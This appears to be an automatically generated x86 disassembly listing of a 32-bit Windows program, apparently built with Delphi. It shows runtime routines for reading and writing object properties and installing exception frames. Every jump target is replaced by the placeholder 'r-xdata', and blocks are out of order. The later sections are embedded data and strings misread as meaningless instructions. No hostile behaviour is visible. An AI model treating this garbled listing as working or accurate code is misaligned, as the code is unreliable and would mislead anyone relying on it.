call [ ecx ]
retn
sub_414844
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_4148b8
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_414914
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414958
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4149d4
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_404284
mov ecx esp
mov edx esi
mov eax ebx
call sub_414958
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414a1c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414a08
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414a5c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414a08
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414a9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414ae4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414bb8
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414aeb
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
sub_414af4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414b3c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404814
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b43
lea eax [ ebp - 0x4 ]
call sub_4046c8
retn
sub_414b4c
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_4149ac
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414a1c
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414a9c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_403fe8
pop ebx
retn
sub_414b8c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_4149d4
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414a5c
pop ebx
retn
dec bl
je r-xdata
call sub_414af4
jmp r-xdata
pop ebx
retn
sub_414bb8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414c90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414b4c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404814
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c97
lea eax [ ebp - 0x10 ]
call sub_403fe8
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404704
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046c8
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_414ca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414d66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404270
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414b8c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d6d
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404704
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414d74
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4145bc
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_414db4 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_4145bc
cmp [ eax ] 0x4
jne r-xdata
sub_414e8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_4145bc
mov al [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_414ed4 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_415003 ]
jmp [ eax * 4 + jump_table_414f70 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov ax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_415098
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_415084
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_4150d8
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_415084
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_415118
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_415158
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_415190
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_4151b8
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_4151f4
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_4058c0
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_415274
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_4058c0
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_4152e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41532e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415335
retn
mov eax rw-data
call sub_403fe8
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a64
sub_415375
or cl [ ecx + 0x4c ]
outsd
arpl [ ebx + 0x42 ] bp
jns r-xdata
imul esi [ esi + 0x65 ] 0xff000558
dec [ ebx + 0x415400c0 ]
jae r-xdata
or ecx [ ecx + 0x41 ]
jbe r-xdata
adc [ eax ] eax
add [ edx ] ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
pop es
add bh bh
dec [ ebp + 0x53a80040 ]
inc ecx
add [ esi ] cl
or esi [ ecx + 0x67 ]
push ebx
push esp
inc ecx
push esp
inc esp
inc ecx
push esp
inc ecx
and [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
enter 0x4153 0x0
sbb [ eax ] al
add [ eax ] al
lea eax [ eax ]
int3
arpl [ esp + ecx * 2 + 0x11 ] si
inc eax
add [ ecx ] al
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
adc eax 0x8dffff00
inc eax
add [ eax + 0x54 ] ch
inc ecx
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
push edi
imul ebp [ esi + 0x64 ] 0x114c776f
inc eax
add [ ecx ] al
adc al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
push 0x65
jae r-xdata
bound ebp [ edx + 0x65 ]
dec edi
add [ esi ] cl
or al 0x74
popad
inc ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov eax 0x4004010
add [ eax ] al
add [ eax + 0x8004010 ] bh
add [ eax ] al
add [ eax + 0xc004010 ] bh
add [ eax ] al
add [ ebx + 0x415434c0 ] cl
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
dec edi
push ebx
imul ebp [ esi + 0x6b ] r-xdata
add [ edi ] ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add eax 0x8bffff00
rol [ eax ] 0x54
inc ecx
sub_4153c9
push ebx
inc ecx
add [ edi ] cl
or ecx [ ecx + 0x41 ]
jbe r-xdata
push 0x65
jae r-xdata
arpl [ esp + ecx * 2 + 0x11 ] si
inc eax
add [ ecx ] al
adc al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
adc eax 0x8dffff00
inc eax
add [ eax + 0x54 ] ch
inc ecx
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
push edi
imul ebp [ esi + 0x64 ] 0x114c776f
inc eax
add [ ecx ] al
adc al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add al [ eax ]
dec edi
bound ebp [ edx + 0x65 ]
push ebx
imul ebp [ esi + 0x6b ] r-xdata
add [ edi ] ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
pop eax
add eax 0x8bffff00
rol [ eax ] 0x54
inc ecx
add [ esi ] cl
or al 0x74
popad
inc ebp
pop eax
inc ebx
inc ebp
push eax
dec ecx
dec esi
inc esi
dec edi
and [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov eax 0x4004010
add [ eax ] al
add [ eax + 0x8004010 ] bh
add [ eax ] al
add [ eax + 0xc004010 ] bh
add [ eax ] al
add [ ebx + 0x415434c0 ] cl
add [ edi ] cl
or cl [ ecx + 0x4f ]
insb
dec edi
sub_415660
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415685
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41568c
retn
sub_415884
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4161d3
call [ eax - 0x6bffbe6e ]
xchg edx eax
inc ecx
add [ eax - 0x23ffbe6e ] ah
xchg edx eax
inc ecx
add [ ebx ] cl
push esp
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
hlt
sub_416360
push cs
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
call 0xffffffffe041a56c
outsb
dec ecx
je r-xdata
add [ edx + esi ] ah
imul ebp [ esi + 0x67 ] 0x7473694c
je r-xdata
xchg esi eax
inc ecx
add [ ebp - 0x5a0fffbf ] bh
inc ecx
add ah dh
movsd [ edi ] [ esi ]
inc ecx
add al bh
movsd [ edi ] [ esi ]
inc ecx
add ah cl
0xa76c0041 0x41
enter 0x41a7 0x0
pushfd
test al 0x41
add [ ecx - 0x5727ffbf ] cl
inc ecx
add [ ecx + ebp * 4 + 0x41 ] cl
add [ eax - 0x5d ] dh
inc ecx
add [ ebx + 0x41 ] bh
add [ eax ] ch
xchg esi eax
inc ecx
add [ eax ] bl
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x5c ] bl
inc ecx
add ah al
movsb [ edi ] [ esi ]
inc ecx
add [ eax - 0x66 ] bh
inc ecx
add [ esi + 0x41 ] dl
add [ eax + 0x5400419c ] al
popfd
inc ecx
add [ eax - 0x5fffbe5a ] dl
cmpsb [ esi ] [ edi ]
inc ecx
add [ eax + 0xc00419d ] bh
sahf
inc ecx
add [ eax + 0x5000419e ] bh
mov al [ 0xffffffffa0a80041 ]
inc ecx
add [ ecx ] bh
inc ecx
add al ah
mov [ 0xffffffffa3fc0041 ] eax
inc ecx
add ah dh
cmpsb [ esi ] [ edi ]
inc ecx
add [ ebp + 0x41 ] al
add [ ecx + ebp * 4 ] al
inc ecx
add [ ecx + ebp * 4 ] dl
inc ecx
add [ ebx ] cl
push esp
push ebx
je r-xdata
xchg edi eax
inc ecx
add al ah
insd
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
int3
push ebx
je r-xdata
popad
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx + ebp * 4 - 0x5617ffbf ] bl
inc eax
add [ eax ] cl
inc ecx
add [ edi ] al
or edx [ ebx + edx * 2 + 0x74 ]
jb r-xdata
push ebx
je r-xdata
popad
insd
mov eax eax
int3
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add [ edx + ebp + 0x2aac0040 ] ch
inc eax
add [ eax + 0x240041aa ] ah
stosd [ edi ]
inc ecx
add [ edi ] al
push esp
push ebx
je r-xdata
pushfd
test eax 0xa9e80041
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cmp [ ebx + 0x41 ] ah
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
insd
dec ebp
insd
outsd
jb r-xdata
popad
insd
inc eax
inc cx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] bl
add [ eax ] dl
add [ eax ] al
add [ eax - 0x5fffbe9c ] bl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx + ebp * 4 - 0x5617ffbf ] bl
inc ecx
add [ eax ] al
stosb [ edi ]
inc ecx
add al dh
scasd [ edi ]
inc ecx
add [ edx + ebp - 0x4fd7ffc0 ] ch
inc ecx
add [ ebx + ebp * 4 ] ah
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
jb r-xdata
jae r-xdata
jns r-xdata
push ebx
je r-xdata
and al 0xab
je r-xdata
insb
add [ ebp + ebp * 4 + 0x540d0041 ] dh
dec eax
popad
outsb
insd
push esp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x65 ] dh
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x5fffbe9c ] bl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ ecx + ebp * 4 - 0x521fffbf ] bl
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ ebp + ebp * 4 - 0x525bffbf ] dl
inc ecx
add [ eax - 0x4bffbe56 ] ah
lodsd [ esi ]
inc ecx
add [ 0x6e614854 ] cl
popad
xor al [ eax ]
and al 0x32
add [ ebp + 0x64e40040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax + eax ] al
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
pushfd
test eax 0xa9e80041
je r-xdata
outsd
jb r-xdata
insd
popad
insd
mov esp 0x4166
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
inc cx
add [ eax + eax ] dl
add [ eax ] al
